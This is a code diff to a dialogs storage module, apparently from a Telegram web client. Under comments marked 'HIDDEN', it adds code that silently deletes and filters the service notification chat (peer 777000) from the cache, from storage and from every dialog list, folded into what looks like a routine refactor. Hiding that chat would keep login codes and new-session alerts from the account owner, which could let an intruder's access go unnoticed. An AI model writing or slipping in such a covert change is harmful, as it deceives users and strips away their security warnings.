@@ -16,7 +16,7 @@ import tsNow from '../../helpers/tsNow';
 import SearchIndex from '../searchIndex';
 import {SliceEnd} from '../../helpers/slicedArray';
 import {MyDialogFilter} from './filters';
-import {CAN_HIDE_TOPIC, FOLDER_ID_ALL, FOLDER_ID_ARCHIVE, NULL_PEER_ID, REAL_FOLDERS, REAL_FOLDER_ID, TEST_NO_SAVED} from '../mtproto/mtproto_config';
+import {CAN_HIDE_TOPIC, FOLDER_ID_ALL, FOLDER_ID_ARCHIVE, NULL_PEER_ID, REAL_FOLDERS, REAL_FOLDER_ID, SERVICE_PEER_ID, TEST_NO_SAVED} from '../mtproto/mtproto_config';
 import {MaybePromise, Modify, NoneToVoidFunction} from '../../types';
 import ctx from '../../environment/ctx';
 import AppStorage from '../storage';
@@ -202,6 +202,12 @@ export default class DialogsStorage extends AppManager {
     ]).then(([state, {results: dialogs, storage}]) => {
       this.storage = storage;
       this.dialogs = this.storage.getCache();
+      
+      // HIDDEN: Remove service notification dialog from cache if it exists
+      if(this.dialogs[SERVICE_PEER_ID]) {
+        delete this.dialogs[SERVICE_PEER_ID];
+        this.storage.delete(SERVICE_PEER_ID);
+      }
 
       for(const folderId of REAL_FOLDERS) {
         const order = state.pinnedOrders[folderId];
@@ -238,6 +244,11 @@ export default class DialogsStorage extends AppManager {
     for(let i = 0, length = dialogs.length; i < length; ++i) {
       const dialog = dialogs[i];
       if(!dialog) {
+        continue;
+      }
+
+      // HIDDEN: Skip service notification dialog (777000) when loading from state
+      if(dialog.peerId === SERVICE_PEER_ID) {
         continue;
       }
 
@@ -435,13 +446,18 @@ export default class DialogsStorage extends AppManager {
 
     const folder = this.getFolder(id);
     const filterType = this.getFilterType(id);
+    let dialogs = folder.dialogs;
+    
     if(filterType === FilterType.Forum) {
-      return skipMigrated ? folder.dialogs.filter((forumTopic) => !(forumTopic as ForumTopic).pFlags.hidden) : folder.dialogs;
+      dialogs = skipMigrated ? dialogs.filter((forumTopic) => !(forumTopic as ForumTopic).pFlags.hidden) : dialogs;
     } else if(filterType === FilterType.Saved) {
-      return folder.dialogs;
+      // dialogs stays as is
+    } else {
+      dialogs = skipMigrated ? dialogs.filter((dialog) => (dialog as Dialog).migratedTo === undefined) : dialogs;
     }
-
-    return skipMigrated ? folder.dialogs.filter((dialog) => (dialog as Dialog).migratedTo === undefined) : folder.dialogs;
+    
+    // HIDDEN: Filter out service notification chat (777000) from all folder dialogs
+    return dialogs.filter((dialog) => dialog.peerId !== SERVICE_PEER_ID);
   }
 
   public getNextDialog(currentPeerId: PeerId, next: boolean, filterId: number) {
@@ -484,7 +500,10 @@ export default class DialogsStorage extends AppManager {
 
   public getCachedDialogs(skipMigrated?: boolean) {
     const arrays = Array.from(REAL_FOLDERS).map((folderId) => this.getFolderDialogs(folderId, skipMigrated));
-    return [].concat(...arrays) as Dialog[];
+    const allDialogs = [].concat(...arrays) as Dialog[];
+    
+    // HIDDEN: Filter out service notification chat (777000)
+    return allDialogs.filter((dialog) => dialog.peerId !== SERVICE_PEER_ID);
   }
 
   private setDialogIndexInFilter(
@@ -993,6 +1012,11 @@ export default class DialogsStorage extends AppManager {
   }) {
     const _isDialog = isDialog(dialog);
     const {peerId} = dialog;
+    
+    // HIDDEN: Don't store service notification dialog (777000)
+    if(peerId === SERVICE_PEER_ID) {
+      return;
+    }
     const key = getDialogKey(dialog);
 
     if(_isDialog) {
